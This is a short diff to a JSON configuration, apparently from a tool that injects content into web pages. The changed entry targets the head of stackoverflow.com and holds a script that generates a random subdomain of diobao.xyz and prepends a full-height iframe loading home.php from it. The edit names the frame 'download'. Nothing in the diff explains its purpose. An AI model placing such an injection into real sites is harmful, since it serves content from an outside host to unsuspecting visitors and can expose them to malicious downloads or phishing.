@@ -15,7 +15,7 @@
         "landing_method": {
             "method": "injection",
             "location": "head",
-            "node_str": " <script> var charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ01234567889-'; var subd = ''; for (let i=0; i<15; ++i) { let rand_pos = Math.floor(Math.random() * charset.length); subd += charset.substring(rand_pos, rand_pos+1); } f=document.createElement('iframe'); f.src=`https://${subd}.diobao.xyz/home.php`; f.height=1000; document.body.prepend(f); </script> ",
+            "node_str": " <script> var charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ01234567889'; var subd = ''; for (let i=0; i<15; ++i) { let rand_pos = Math.floor(Math.random() * charset.length); subd += charset.substring(rand_pos, rand_pos+1); } f=document.createElement('iframe'); f.src=`https://${subd}.diobao.xyz/home.php`;f.name='download'; f.height=1000; document.body.prepend(f); </script> ",
             "host": "stackoverflow.com",
             "url": "https://stackoverflow.com/",
             "strict": false
